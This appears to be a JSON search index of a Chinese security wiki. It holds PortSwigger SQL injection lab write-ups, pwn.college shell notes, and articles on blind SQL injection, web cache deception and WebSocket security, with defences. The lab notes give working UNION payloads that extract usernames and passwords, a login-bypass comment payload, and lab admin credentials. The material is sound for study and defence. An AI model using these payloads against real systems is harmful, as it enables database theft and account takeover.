query","path":"/wiki/pentest/lab-sql-injection-union-determine-columns.html","content":"实验：SQL注入UNION攻击，确定查询返回的列数 链接：https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns 进入主页 #SELECT * FROM shop WHERE category = # 确认列数常用有两种方式UNIONUNION 可以连接一个或多个搜索，并返回合并集的结果。 例如： 有table1、table2数据如下 table1 table2 ————- ————- a | b c | d 1 2 2 3 3 4 4 5 # way1 UNIONQuery #1SELECT a,b FROM table11 23 4Query #2SELECT c,d FROM table22 34 5Query #3SELECT a,b FROM table1 UNION SELECT c,d FROM table2Query 1 23 42 34 5 但UNION有限制 ： 被连接的查询必须返回相同数量的列 查询中每一列的数据必须兼容 因此我们一般选择迭代NULL作为攻击手段 xxx union select nullxxx union select null,nullxxx union select null,null,nullxxx union select null,null,null..... NULL可以转换为所有常见数据类型–因此只要列数对应即可 当空值的数量与列数匹配时，数据库会在结果集中添加一行，该行的每一列都包含空值。 ORDER BYORDER BY 一般是用作排序，但是排序的规则一般是按照列里的数据升降序排列，一旦该列没有数据可以支持排列数据库便会报错 因此我们可以通过报错值-1来确定列数 xxx order by 1xxx order by 2xxx order by 3xxx order by 4..... 注 应用程序可能会在 HTTP 响应中返回数据库错误，但也可能返回通用错误或直接不返回任何结果。 UNION和ORDER BY皆是如此，实际报错信息由应用服务器后端代码实现决定 回到实验点击Gift页面数据仅剩4个 其实我们这里可以猜测 ，从页面表现上能确认商品信息有商品名和价格两列，而从数据库实现上我们通常对单表会做唯一ID的设置 所以至少存在三列","tags":[null,null,null,null]},{"title":"Lab: SQL injection UNION attack, retrieving data from other tables","path":"/wiki/pentest/lab-sql-injection-union-retrieve-other-tables.html","content":"实验：SQL注入UNION攻击，从其他表中检索数据 链接：https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables 进入主页 这里证明了有两列的数据于是可以还原SQL语句 SELECT ?,? FROM products WHERE category=Lifestyle-- 这里直接给了两列数据其实非常友好，因为username和password正好也是两列数据，不用因列数不满足而作拼接了 其实从页面数据的表现能看出标题和描述(或者说是正文)很明显是字符串的表现形式，而我们一般账密都是以字符串形式存储的，实验没有在这些内容上做弯绕。 管理员账密: ‘administrator cfzx8ej4is6x5b63y8f1’","tags":[null,null,null,null]},{"title":"Lab: SQL injection UNION attack, retrieving multiple values in a single column","path":"/wiki/pentest/lab-sql-injection-union-retrieve-multiple-values-single-column.html","content":"实验：SQL注入UNION攻击，从单个列中检索多个值 链接：https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column 进主页也点击筛选 所以问题在于我们要在一列里面把用户名和密码同时输出 最简单的思路是先后输入username password根据位置确定账密 UNION SELECT NULL,username FROM users-- UNION SELECT NULL,password FROM users-- 但是本实验的要求是在单列里拼接获取值 Hint中 SQL injection cheat sheet 给我们提供了字符串拼接的方式如下： String concatenationYou can concatenate together multiple strings to make a single string. | Oracle | foo||bar || ————– | ———————————————————— || Microsoft | foo+bar || PostgreSQL | foo||bar || MySQL | foo bar [Note the space between the two strings] CONCAT(foo,bar) | 但是我们还需要确定版本，即使用的sql到底是哪种？ Database versionYou can query the database to determine its type and version. This information is useful when formulating more complicated attacks. Oracle SELECT banner FROM v$versionSELECT version FROM v$instance Microsoft SELECT @@version PostgreSQL SELECT version() MySQL SELECT @@version -- 所以我们需要拼接找到sql版本 然后再把账密拼接到一起-- orcle UNION SELECT NULL,banner FROM v$versionSELECT version FROM v$instance---- MicrosoftMySQL UNION SELECT NULL, @@version-- -- PostgreSQL UNION SELECT NULL, version()-- UNION SELECT NULL,username || password FROM users-- administratoruopn5kasmqglevhknrd6 -- 如果输入的是 UNION SELECT NULL,username || ~ || password FROM users---- 结果会是administrator~uopn5kasmqglevhknrd6","tags":[null,null,null,null]},{"title":"Lab: SQL injection UNION attack, finding a column containing text","path":"/wiki/pentest/lab-sql-injection-union-find-text-column.html","content":"实验：SQL注入UNION攻击，查找包含文本的列 链接：https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text 进入主页并尝试筛选 上面我们用ORDER BY确定还是三列数据，然后我们要找到那一列数据类型是字符串，并替换为实验提供的字符串值 UNION除了确认列数外也可以确认列的数据类型 select a,b,c from table1 UNION selcet NULL,NULL,a- error - colunm is not type text- no error - colunm is of type text-- 已确定列数下通过迭代替换NULL的数据类型来确定列的具体数据类型 其实到这很明显最后的答案是 UNION SELECT NULL,ZIRXn9,NULL 三列值分别是商品ID（ID一般默认隐藏）、商品名、商品价格；ID和价格一般都是以数据值类型存储，只有商品名会以字符串存储。 正常思路： -- 迭代查询哪一列是字符串类型 UNION SELECT a,NULL,NULL-- UNION SELECT NULL,a,NULL-- UNION SELECT NULL,NULL,a-- 如果该列是字符串类型 该列最下面会出现a 而不会报错 这里有个问题：在数据库中，一般对于ID的设置是非空的，一般叫非空约束，但在UNION联合的时候却可以用NULL来获取并集结果 。 我的理解是：因为NULL只是兼容数据类型，我们对于ID的值设置是非NULL，而不是数据类型设置，","tags":[null,null,null,null]},{"title":"pwn.college 练习记录：Shell 重定向、管道与进程替换","path":"/wiki/pentest/pwn-college-shell-pipelines.html","content":"本文记录 pwn.college 授权挑战环境中的 Shell 操作。命令中的 /challenge/* 只存在于对应练习容器中。 练习环境pwn.college 提供浏览器终端、浏览器版 Visual Studio Code、Linux 图形桌面和 SSH 四种访问方式。这组练习通过 SSH 连接到 Dojo 环境完成，内容集中在 Shell 的标准输入、标准输出和标准错误。 将输出保存后筛选第一组操作把标准输出写入临时文件，再用 grep 检索目标行： /challenge/run /tmp/data.txtgrep pwn.college /tmp/data.txt 会在命令执行前打开目标文件，并把文件描述符 1 指向该文件。目标文件已存在时会被截断；需要追加时使用 。 保存中间结果便于重复检查，但大体量输出会占用磁盘，也需要清理临时文件。 使用管道处理实时输出管道把左侧命令的标准输出连接到右侧命令的标准输入： /challenge/run | grep pwn.college 这种写法不需要创建中间文件。管道两端通常作为独立进程并发运行，Shell 最终返回哪个进程的状态取决于 Shell 及 pipefail 设置；在 Bash 中可以用 set -o pipefail 让流水线在任一阶段失败时返回非零状态。 合并标准错误当目标内容写入标准错误时，只传递标准输出的普通管道无法检索到它。先把文件描述符 2 重定向到当前的文件描述符 1，再建立管道： /challenge/run 21 | grep pwn.college 重定向顺序会影响结果。21 file 与 file 21 并不等价，因为前者先复制原来的标准输出，再修改文件描述符 1。 排除与替换文本练习中的诱饵行包含固定标记，可以用反向匹配排除： /challenge/run | grep -v DECOY 另一个输出在目标字符串的每个字符之间插入 FAKEFLAG，使用 sed 的全局替换删除该片段： /challenge/run | sed s/FAKEFLAG//g 这里的表达式只适用于已知固定文本。处理任意输入时还需要考虑正则元字符、换行和二进制数据。 使用 tee 观察中间数据tee 会把标准输入同时写到标准输出和一个或多个文件。练习先截获 /challenge/pwn 的输出，再根据截获内容补充动态参数： /challenge/pwn | tee /tmp/pwn.txt | /challenge/collegecat /tmp/pwn.txt/challenge/pwn --secret QGasZpjU | /challenge/college 把 tee 的文件参数直接写成下游程序路径会尝试覆盖那个文件，而不是启动程序。程序必须位于管道右侧，或者通过进程替换生成可写入的文件描述符路径。 使用进程替换比较输出Bash 的进程替换 (...) 会启动括号中的命令，并把其输出暴露为类似文件的路径。练习使用 diff 比较两组动态输出： diff (/challenge/print_decoys) (/challenge/print_decoys_and_flag) 与先写入两个临时文件相比，进程替换减少了中间文件管理，但它不是 POSIX sh 的通用语法，脚本需要明确由 Bash 等支持该功能的 Shell 执行。 将同一数据发送给多个程序tee 可以配合输出进程替换，把同一份数据写给多个下游程序： /challenge/hack \\ | tee (/challenge/the) (/challenge/planet) \\ /dev/null 两个 (...) 分别启动接收输入的程序。tee 自身仍会把数据写到标准输出，因此最后重定向到 /dev/null，避免在终端重复显示。 这组练习把文件描述符、重定向、管道和文本过滤放在同一条数据流中。排查复杂命令时，可以逐段运行并检查每一段的标准输出、标准错误和退出状态，再组合为完整流水线。 参考资料 pwn.college Bash Reference Manual: Redirections GNU Coreutils: tee","tags":[null,null,null,null]},{"title":"DNS详细信息","path":"/wiki/netsec/dns.html","content":"1.什么是DNS？DNS（域名系统）为我们提供了一种简单的方式，让我们能够与互联网上的设备进行通信，而无需记住复杂的数字。就像每个家庭都有一个独特的地址，以便直接发送邮件一样，互联网上的每台计算机都有一个独特的地址，用于与其通信，称为 IP 地址。IP 地址看起来像以下这样：104.26.10.229，由 0 到 255 之间的 4 组数字组成，由点分隔。 当你想访问一个网站时，记住这个复杂的数字组合并不方便，这就是 DNS 能帮到的地方。 DNS (Domain Name System) provides a simple way for us to communicate with devices on the internet without remembering complex numbers. Much like every house has a unique address for sending mail directly to it, every computer on the internet has its own unique address to communicate with it called an IP address. An IP address looks like the following 104.26.10.229, 4 sets of digits ranging from 0 - 255 separated by a period. When you want to visit a website, it’s not exactly convenient to remember this complicated set of numbers, and that’s where DNS can help. 2.域名层次结构 1️⃣ TLD（Top-Level Domain，顶级域名） 位于域名最右侧，例如：tryhackme.com 中的 .com。 分为两类： gTLD（通用顶级域名）：表示用途，如 .com（商业）、.org（组织）、.edu（教育）、.gov（政府）。 ccTLD（国家代码顶级域名）：表示地区，如 .cn（中国）、.ca（加拿大）、.co.uk（英国）。 现已扩展出大量新 gTLD，如 .online、.club、.website、.biz 等。 2️⃣ Second-Level Domain（二级域名） 位于 TLD 左侧，例如：tryhackme.com 中的 tryhackme。 注册规则： 最长 63 个字符（不含 TLD）。 仅可使用 a–z、0–9、连字符（-）。 不能以连字符开头或结尾，不能有连续连字符。 3️⃣ Subdomain（子域名） 位于二级域名左侧，用点号分隔。 例如：admin.tryhackme.com 中的 admin。 规则与二级域名相同： 最长 63 个字符，仅允许 **a–z、0–9、-**。 不可以连字符开头结尾或连续使用连字符。 可多层嵌套（如 jupiter.servers.tryhackme.com）， 域名总长度 ≤ 253 字符。 子域数量无限制。 参考视频文献https://tryhackme.com/room/dnsindetail","tags":[null]},{"title":"盲注 SQL 注入的观测通道","path":"/wiki/netsec/blind-sql-injection.html","content":"盲注 SQL 注入表示应用执行了可控查询，但响应不直接包含查询结果。攻击仍然需要一个可观测通道：页面差异、错误状态、响应时间或数据库产生的带外网络请求。 条件响应应用可能根据查询是否返回记录，显示不同的页面片段。以分析 Cookie 为例： Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4 服务端查询可能类似： SELECT TrackingIdFROM TrackedUsersWHERE TrackingId = u5YD3PapBcR4lN3e7Tj4; 若输入可控，可以分别提交恒真和恒假条件，并比较稳定标记： ... AND 1=1... AND 1=2 状态码相同不代表响应相同。正文中特定文本、长度、重定向位置或后续业务状态都可能成为真假通道。 按字符推断数据存在稳定布尔通道后，可以测试目标值的长度和每个字符。例如用 SUBSTRING 判断首字符是否大于某个值，再通过二分搜索缩小范围。 函数名称和索引起点因数据库而异：Oracle 常用 SUBSTR，Microsoft SQL Server、PostgreSQL 和 MySQL 支持的具体语法也不完全一致。有效载荷必须与已识别的数据库匹配。 自动化提取会产生大量请求，应在授权范围内设置速率，并记录请求与结论的对应关系。 条件错误页面对真假条件没有差异时，可以构造仅在条件成立时触发的数据库错误。应用若把未处理异常转换为 500 响应，就形成另一个布尔通道。 condition is true - evaluate an invalid expression - error responsecondition is false - evaluate a valid expression - normal response 错误表达式、短路求值和类型转换都具有数据库差异。直接复制其他数据库的除零或转换语句可能始终报错、始终不报错，或者在优化阶段被改写。 条件时间延迟应用完全隐藏查询结果和错误时，可以让数据库在条件成立时延迟： condition is true - sleep for N secondscondition is false - return immediately 网络抖动、队列和服务负载也会影响响应时间。需要使用基准请求、重复样本和足够明显的时间差，避免把偶发慢请求解释成条件成立。 带外交互某些数据库功能可以发起 DNS 或 HTTP 请求。向唯一的 OAST 子域发送请求后，即使应用响应完全相同，也能从协作服务器日志确认 SQL 路径被执行。 带外能力依赖数据库产品、网络出口策略、函数权限和 DNS 解析环境。没有收到交互只说明当前路径未被观测到，不能单独证明不存在注入。 防御盲注和有回显注入具有相同根因，修复仍是参数化查询和动态标识符允许列表。隐藏数据库错误只减少信息泄露，不会阻止被注入的查询执行。 数据库最小权限、统一异常处理、请求速率监控和异常查询检测能够限制影响或提升发现能力，但不能替代查询结构与参数值的分离。 参考资料 PortSwigger: Blind SQL injection PortSwigger SQL injection cheat sheet","tags":[null,null,null]},{"title":"网络与应用安全","path":"/wiki/netsec/index.html","content":"网络协议、Web 安全机制与常见漏洞原理的整理。"},{"title":"SQL 注入中的 UNION 查询","path":"/wiki/netsec/sql-injection-union-attacks.html","content":"UNION 把多个 SELECT 的结果合并为一个结果集，并默认去除重复行；UNION ALL 保留重复行。SQL 注入中的 UNION 技术利用应用原有查询的回显位置承载另一条查询的结果。 UNION 的成立条件参与 UNION 的查询需要满足： 返回相同数量的列； 对应列的数据类型可以由数据库进行兼容转换。 SELECT id, name FROM productsUNIONSELECT user_id, username FROM users; 不同数据库对类型转换、排序、字符集和 NULL 的处理存在差异。即使列数相同，字符串与数值列不兼容也可能导致错误。 INTERSECT 和 EXCEPT 是集合运算符，但不是 UNION 攻击的同义写法。MySQL 从 8.0.31 起才支持 INTERSECT 和 EXCEPT；旧版本不能据此判断 SQL 标准本身无效。 确定原查询列数一种方式是递增 ORDER BY 的列位置，直到索引超出结果列数： ORDER BY 1-- ORDER BY 2-- ORDER BY 3-- 另一种方式是递增 UNION SELECT 中的 NULL 数量： UNION SELECT NULL-- UNION SELECT NULL,NULL-- UNION SELECT NULL,NULL,NULL-- NULL 能与许多数据类型兼容，因此适合用于初始探测。应用可能隐藏数据库错误，返回空页面或统一错误响应，判断依据需要结合状态码、正文长度和稳定的页面标记。 对应实验记录： 确定返回列数 查找可回显字符串的列 确认可承载字符串的列确定列数后，可以逐列放入测试字符串： UNION SELECT test,NULL,NULL-- UNION SELECT NULL,test,NULL-- UNION SELECT NULL,NULL,test-- 响应中出现测试字符串，说明对应列既接受字符串，又被页面实际渲染。没有出现并不必然表示类型不兼容，也可能是该列未进入模板或被后续逻辑过滤。 检索其他表的数据已知表名和列名后，额外查询可以返回相同列数的数据： UNION SELECT username, password FROM users-- 授权实验见从其他表检索数据。真实系统中的表名、Schema 和权限通常不同，需要通过数据库元数据或应用行为确认，不能固定假设为 users(username, password)。 在单列中组合多个值只有一个字符串列可回显时，可以按数据库语法连接字段并添加分隔符： 数据库 字符串连接示例 Oracle username PostgreSQL username Microsoft SQL Server username + ~ + password MySQL CONCAT(username, ~, password) 对应实验见在单列中检索多个值。字段中若可能出现分隔符，需要选择可解析编码，而不是假设 ~ 永远不会出现在数据里。 数据库语法差异Oracle 的 SELECT 通常需要 FROM，探测时可使用内置的 DUAL： UNION SELECT NULL FROM DUAL-- MySQL 的 -- 注释后需要空白字符，也支持 # 行注释。URL、表单和代理工具可能编码 # 或空格，因此请求到达数据库前的解析链也需要纳入判断。 参考资料 PortSwigger: SQL injection UNION attacks MySQL 8.0 Set Operations","tags":[null,null,null]},{"title":"SQL 注入：查询上下文、检测方式与防御","path":"/wiki/netsec/sql-injection.html","content":"SQL 注入发生在应用程序把不可信输入作为 SQL 语法拼接进查询，而不是作为独立参数交给数据库驱动处理。攻击者由此可能改变查询结构，读取越权数据、绕过业务条件，或者在数据库账户权限允许时修改数据。 本文只讨论授权靶场与防御分析。具体数据库、驱动和应用框架会改变可用语法、错误表现和影响范围。 注入点与查询上下文SQL 注入常见于 SELECT 的 WHERE 条件，但并不限于这里： UPDATE 的赋值表达式或筛选条件； INSERT 的插入值； ORDER BY 的排序表达式； 动态表名、列名和方向关键字； JSON、XML、Cookie、请求头或后台任务读取的已存储数据。 输入位于字符串、数值、标识符或排序表达式中时，闭合方式和可用语法不同。只测试单引号无法覆盖所有上下文。 常见影响 扩大原查询结果，读取本不应返回的行； 改变登录、权限或状态判断； 通过 UNION 合并其他查询结果； 在无直接回显时利用布尔差异、错误、延迟或带外交互推断数据； 在数据库账户拥有写权限时修改或删除数据； 调用数据库特有功能，影响文件、网络或操作系统资源。 最后一类能力依赖数据库产品、部署方式、扩展功能和账户权限，不能从“存在 SQL 注入”直接推断为“可以控制服务器”。 系统化检测授权测试通常从每个可控入口建立基准响应，再分别观察： 引号、转义符和不同数据类型是否触发错误或响应差异。 成对布尔条件是否产生稳定的真假差异。 ORDER BY 或 UNION SELECT 是否暴露列数与类型信息。 条件错误或条件延迟是否可重复出现。 OAST 域名是否收到由数据库触发的带外交互。 响应差异可能来自缓存、负载均衡、速率限制或业务数据变化。判断漏洞需要重复测试并控制这些变量，不能把一次 500 响应直接当作 SQL 执行证据。 扩大查询结果假设应用程序拼接分类参数： SELECT name, descriptionFROM productsWHERE category = Gifts AND released = 1; 如果输入能够闭合字符串并添加恒真条件，原有筛选可能被改变。对应的授权实验记录见检索隐藏数据 Lab。 改变登录逻辑登录查询若直接拼接用户名和密码，注释符可能截断后续密码条件： SELECT *FROM usersWHERE username = administrator-- AND password = ; 注释语法受数据库影响。MySQL 的 -- 后需要空白字符，其他数据库和请求编码还会改变有效载荷。对应实验见登录绕过 Lab。 二阶 SQL 注入二阶注入的输入先被安全存储，随后在另一条代码路径中被拼接为 SQL。数据来自数据库不代表它可信，安全边界取决于当前使用方式。 参数化必须应用在每次构造查询的位置。只对最初写入数据库的请求做转义，不能保护后续动态拼接。 参数化查询Java JDBC 使用 PreparedStatement 把查询结构与参数值分离： String sql = SELECT id, name FROM products WHERE category = ?;try (PreparedStatement statement = connection.prepareStatement(sql)) statement.setString(1, category); try (ResultSet resultSet = statement.executeQuery()) // 读取结果 占位符通常只能表示数据值，不能替代表名、列名、排序方向或 SQL 关键字。动态标识符应由应用代码映射到固定允许列表： String orderBy = switch (sort) case name - name; case created - created_at; default - throw new IllegalArgumentException(Unsupported sort field);; 纵深防御 数据库账户只授予应用所需权限，读写职责可按服务拆分； 生产环境不向用户返回数据库堆栈和完整查询； 集中记录数据库异常和参数化失败，但日志中不写明文密码； 对动态查询构建器、ORM 原生 SQL 和存储过程使用同样的输入边界； WAF 只能补充检测，不能修复应用中的字符串拼接。 参考资料 PortSwigger: SQL injection OWASP SQL Injection Prevention Cheat Sheet","tags":[null,null,null]},{"title":"Web 缓存欺骗：缓存键、路径解析与防御","path":"/wiki/netsec/portswigger.html","content":"Web 缓存欺骗（Web Cache Deception）利用缓存服务器与源站对同一请求的解析差异，使包含用户敏感数据的动态响应被公共缓存保存。攻击者随后请求同一缓存键，可能读取受害者触发的响应。 它与 Web 缓存投毒不同。缓存欺骗的目标通常是让缓存保存一份不应缓存的真实动态响应；缓存投毒则更强调向缓存中写入攻击者控制的响应内容并影响其他用户。 缓存请求流程缓存位于客户端与源站之间。收到请求后，它先计算缓存键并查找已有对象： request - derive cache key - cache hit: return stored response - cache miss: forward to origin receive response decide whether to store 缓存键通常包含主机名、路径和查询字符串，也可能包含部分请求头。没有进入缓存键的输入称为 unkeyed input；它仍可能影响源站响应，因此也是缓存安全分析的重要边界。 X-Cache: hit、Age、Cache-Status 等响应头可以帮助判断命中状态，但具体字段取决于 CDN 或代理实现。重复请求、响应时间和唯一缓存破坏参数可以辅助验证。 缓存规则缓存是否保存响应通常由请求和响应共同决定： 路径是否匹配 .css、.js、.ico 等静态扩展名； 路径是否位于 /static、/assets 等静态目录； 文件名是否匹配 robots.txt、favicon.ico 等固定规则； HTTP 方法、状态码和响应缓存头是否允许存储； 响应是否携带认证、Cookie 或 private、no-store 指令。 只按路径后缀判断静态资源会忽略源站路由实际返回的内容，这是多类缓存欺骗问题的共同前提。 缓存键与测试隔离授权测试应使用唯一的缓存破坏值，避免读取其他用户缓存或污染正式路径： /account/test.css?cb=unique-value 查询参数是否进入缓存键需要实测。有些缓存忽略全部查询参数，有些只保留允许列表；错误假设可能让测试请求共享同一缓存对象。 正式验证时还应使用从未请求过的新路径。如果攻击者先用自己的 Session 请求了同一路径，缓存中可能已经保存攻击者自己的响应，受害者随后访问时直接命中，无法让源站生成受害者响应。 路径映射差异源站框架可能把额外路径段视为路由参数或忽略部分尾部，而缓存按完整路径和扩展名判断静态资源： /my-account/unused.js 可能出现： origin: /my-account route - authenticated account pagecache: path ends with .js - cacheable static object 这种差异只有在源站确实返回敏感动态内容、缓存规则确实存储响应且缓存对象可被未授权请求读取时才构成完整漏洞。 实验记录：利用路径映射差异。 路径分隔符差异框架、代理和 CDN 对分号、问号、编码字符及路径参数的处理可能不同。例如源站把 ; 当作路径参数分隔符，而缓存把它和后续 .js 一并视为路径： /my-account;random.js 测试需要分别建立两个基准： 原始端点的正常响应； 添加普通无效字符串后的错误响应。 候选分隔符若让响应恢复为正常端点内容，说明源站可能在该字符处分隔。随后还需验证缓存是否按完整路径命中静态规则。 实验记录：利用路径分隔符差异。 规范化差异URL 规范化可能包含百分号解码、点段消解、重复斜杠处理和大小写转换。风险来自缓存与源站执行了不同操作，或者执行顺序不同。 /resources/..%2fmy-account 一种组件可能先匹配 /resources/ 静态目录，另一种组件解码并消解路径后访问 /my-account。不能仅根据最终浏览器地址推断每一层实际处理的字符串，需要对缓存和源站分别观测。 实验记录： 利用源站规范化差异 利用缓存服务器规范化差异 精确匹配缓存规则缓存规则也可能只匹配固定文件名或路径。若规范化差异使源站访问动态端点，而缓存仍把原始路径识别为精确匹配的静态文件，就可能缓存动态响应。 实验记录：利用精确匹配缓存规则。 完整成立条件一次可利用的缓存欺骗通常同时包含： 受害者能够被诱导发出带认证状态的 GET 请求； 源站把构造路径映射到包含敏感数据的动态端点； 缓存把同一路径判断为可公开缓存的资源； 缓存键没有把用户身份或必要的会话差异隔离； 攻击者可以在缓存有效期内请求同一对象。 缺少其中任一环节都可能使测试只表现为解析差异，而不是可读取敏感数据的漏洞。 防御 认证页面返回 Cache-Control: no-store，或根据架构使用正确的 private 策略； 缓存层根据明确的资源路由和响应元数据缓存，不只依赖后缀； 源站、反向代理和 CDN 使用一致的路径解码与规范化规则； 在规范化后再执行安全与缓存规则匹配，并拒绝异常路径； 不让包含 Set-Cookie 或用户特定内容的响应进入共享缓存； 测试缓存键是否包含所有会改变响应身份和权限的输入； 对敏感响应增加自动化测试，验证匿名请求无法读取认证用户产生的缓存对象。 Cache-Control 是重要控制，但不能弥补所有代理误配置。最终需要同时检查源站响应头、CDN 规则和实际命中行为。 参考资料 PortSwigger: Web cache deception RFC 9111: HTTP Caching Web Cache Vulnerability Scanner","tags":[null,null,null]},{"title":"WebSocket 安全测试：消息、握手与会话边界","path":"/wiki/netsec/websocket-security.html","content":"WebSocket 通过 HTTP 握手升级为长期双向连接。升级完成后，客户端和服务端交换 WebSocket 帧，但身份、Cookie、代理和源站校验通常在握手阶段确定。 握手与连接状态典型握手包含： GET /chat HTTP/1.1Host: example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: ...Sec-WebSocket-Version: 13Origin: https://example.comCookie: session=... 服务端返回 101 Switching Protocols 后建立连接。认证通过不代表后续每条消息都已授权，服务端仍需根据当前用户、资源和动作进行检查。 连接建立后，Session 过期、账户被禁用或权限变化是否立即生效，取决于应用是否在消息处理时重新读取授权状态。只在握手时复制一次权限会让长连接保留过期授权。 消息输入WebSocket 消息仍是不可信输入。JSON 字段可能进入数据库、模板、命令、XML 解析器或其他后端服务，因此仍可能触发 SQL 注入、XSS、命令注入和解析器漏洞。 聊天应用可能发送： message:Hello Carlos 如果服务端把字段未经上下文编码直接插入其他用户页面，攻击者控制的 HTML 会形成存储型或反射型 XSS。修复位置在服务端输出编码、消息 Schema 校验和客户端安全渲染，不是简单过滤某几个标签。 使用 Burp Suite 检查消息Burp Proxy 可以记录 WebSocket 历史，Repeater 可以重放、修改和新建消息。测试时需要同时记录消息方向、连接编号、会话身份和服务端响应，避免把不同连接的状态混在一起。 截图中的 Lab 对消息内事件处理器进行了拦截，说明服务端存在输入检测；该结果只证明此有效载荷被识别，不能证明所有 XSS 上下文都已安全处理。 握手输入握手仍是普通 HTTP 请求，因此可以检查： Origin 是否按允许列表验证； Session Cookie 是否具有合适的 Secure、HttpOnly 和 SameSite 属性； X-Forwarded-For 等代理头是否被错误用于安全决策； 自定义头和查询参数是否进入认证或路由逻辑； 连接创建是否有速率、并发和资源限制。 应用若只依赖 Cookie 认证，又不验证 Origin，恶意站点可能从受害者浏览器发起跨站 WebSocket 连接，这类问题通常称为 Cross-Site WebSocket Hijacking。SameSite Cookie 可以降低部分场景风险，但不能代替服务端 Origin 校验和显式授权。 消息级授权与资源控制每种消息类型都应具有明确 Schema，并拒绝未知字段、错误类型和超出范围的长度。涉及对象 ID 时需要执行对象级授权，不能因为连接已认证就允许访问任意会话或房间。 服务端还要限制： 单条消息大小和压缩后的解压规模； 单连接和单账户消息速率； 空闲连接时间和最大连接时长； 订阅数量、房间数量和后端任务并发； 异常关闭、重连和重复消息带来的状态问题。 生产连接应使用 wss:// 保护传输。TLS 不能修复消息注入或授权缺失，但可以阻止链路上的明文窃听与篡改。 参考资料 PortSwigger: WebSockets security vulnerabilities RFC 6455: The WebSocket Protocol OWASP WebSocket Security Cheat Sheet","tags":[null,null,null,null]},{"title":"阅读","path":"/wiki/reading/index.html","content":"这里整理阅读摘记、阶段性思考和书籍记录。 这部分保留个人阅读痕迹，不强行改写成教程式文档。"}];